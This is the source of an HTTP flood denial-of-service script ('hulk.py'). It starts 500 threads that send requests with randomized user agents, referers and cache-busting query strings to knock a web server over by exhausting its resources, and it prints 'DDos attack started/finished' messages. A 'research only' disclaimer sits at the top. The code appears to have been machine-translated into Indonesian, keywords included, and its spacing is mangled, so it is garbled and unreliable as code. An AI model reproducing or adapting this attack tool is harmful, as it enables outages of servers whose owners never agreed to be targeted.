# ------------------------------------------------- ---------------------------------------------

# DDOS - gunakan dengan bijak

#

# alat ini adalah alat dos yang dimaksudkan untuk meletakkan beban berat pada server HTTP untuk membawanya

# Berlutut dengan melelahkan sumber daya, yang dimaksudkan untuk tujuan penelitian saja

# dan penggunaan berbahaya dari alat ini dilarang.

#

# author: Barry Shteiman, versi 1.0

# ------------------------------------------------- ---------------------------------------------

impor urllib2

impor sys

impor penguliran

impor acak

impor ulang


# params global

url = ' '

host = ' '

headers_useragents = []

headers_referers = []

request_counter = 0

bendera = 0

aman = 0


def inc_counter ():

	request_counter global

	request_counter + = 1


def set_flag ( val ):

	bendera global

	bendera = val


def set_safe ():

	aman global

	aman = 1


# menghasilkan array agen pengguna

def useragent_list ():

	global headers_useragents

	headers_useragents.append ( ' Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3 ' )

	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) ' )

	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729) ' )

	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1 ' )

	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit / 532.1 (KHTML, seperti Gecko) Chrome / 4.0.219.6 Safari / 532.1 ' )

	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.1; WOW64; Trident / 4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2) ' )

	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 6.0; Trident / 4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0. 30729) ' )

	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident / 4.0) ' )

	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 8.0; Windows NT 5.1; Trident / 4.0; SV1; .NET CLR 2.0.50727; InfoPath.2) ' )

	headers_useragents.append ( ' Mozilla / 5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) ' )

	headers_useragents.append ( ' Mozilla / 4.0 (kompatibel; MSIE 6.1; Windows XP) ' )

	headers_useragents.append ( ' Opera / 9.80 (Windows NT 5.2; U; ru) Presto / 2.5.22 Versi / 10.51 ' )

	kembali (headers_useragents)


# menghasilkan rujukan arahan

def referer_list ():

	global headers_referers

	headers_referers.append ( ' http://www.google.com/?q= ' )

	headers_referers.append ( ' http://www.usatoday.com/search/results?q= ' )

	headers_referers.append ( ' http://engadget.search.aol.com/search?q= ' )

	headers_referers.append ( ' http: // ' + host + ' / ' )

	return (headers_referers)


# membangun string ascii acak

def buildblock ( ukuran ):

	out_str = ' '

	untuk i dalam rentang ( 0 , ukuran):

		a = random.randint ( 65 , 90 )

		out_str + = chr (a)

	kembali (out_str)


penggunaan def ():

	cetak ' ------------------------------------------------ --- '

	cetak ' PENGGUNAAN: python hulk.py <url> '

	cetak ' Anda dapat menambahkan "aman" setelah url, ke autoshut setelah dos '

	cetak ' ------------------------------------------------ --- '



# permintaan http

def httpcall ( url ):

	useragent_list ()

	referer_list ()

	kode = 0

	jika url.count ( " ? " ) > 0 :

		param_joiner = " & "

	lain :

		param_joiner = " ? "

	request = urllib2.Request (url + param_joiner + buildblock (random.randint ( 3 , 10 )) + ' = ' + buildblock (random.randint ( 3 , 10 )))

	request.add_header ( ' User-Agent ' , random.choice (headers_useragents))

	request.add_header ( ' Cache-Control ' , ' no-cache ' )

	request.add_header ( ' Accept-Charset ' , ' ISO-8859-1, utf-8; q = 0,7, *; q = 0,7 ' )

	request.add_header ( ' Referer ' , random.choice (headers_referers) + buildblock (random.randint ( 5 , 10 )))

	request.add_header ( ' Keep-Alive ' , random.randint ( 110 , 120 ))

	request.add_header ( ' Connection ' , ' keep-alive ' )

	request.add_header ( ' Host ' , host)

	coba :

			urllib2.urlopen (permintaan)

	kecuali urllib2.HTTPError, e:

			# cetak e.code

			set_flag ( 1 )

			cetak ' Kode Respon 500 '

			kode = 500

	kecuali urllib2.URLError, e:

			# cetak e.alasan

			sys.exit ()

	lain :

			inc_counter ()

			urllib2.urlopen (permintaan)

	kembali (kode)		



# benang pemanggil http

kelas HTTPThread ( threading . Thread ):

	def run ( diri ):

		coba :

			sementara bendera < 2 :

				kode = httpcall (url)

				if (code == 500 ) & (safe == 1 ):

					set_flag ( 2 )

		kecuali Exception , mis:

			lulus


# memonitor utas http dan menghitung permintaan

kelas MonitorThread ( threading . Thread ):

	def run ( diri ):

		sebelumnya = request_counter

		sementara flag == 0 :

			if (sebelumnya + 100 < request_counter) & (sebelumnya <> request_counter):

				print " % d Requests Sent " % (request_counter)

				sebelumnya = request_counter

		jika flag == 2 :

			print " \ n - Serangan DDos Selesai - "


# mengeksekusi

jika len (sys.argv) < 2 :

	pemakaian()

	sys.exit ()

lain :

	if sys.argv [ 1 ] == " help " :

		pemakaian()

		sys.exit ()

	lain :

		print " - Serangan DDos Dimulai - "

		jika len (sys.argv) == 3 :

			jika sys.argv [ 2 ] == " aman " :

				set_safe ()

		url = sys.argv [ 1 ]

		if url.count ( " / " ) == 2 :

			url = url + " / "

		m = re.search ( ' http \: // ([^ /] *) /?.* ' , url)

		host = m.group ( 1 )

		untuk saya dalam rentang ( 500 ):

			t = HTTPThread ()

			t.start ()

		t = MonitorThread ()

		t.start ()

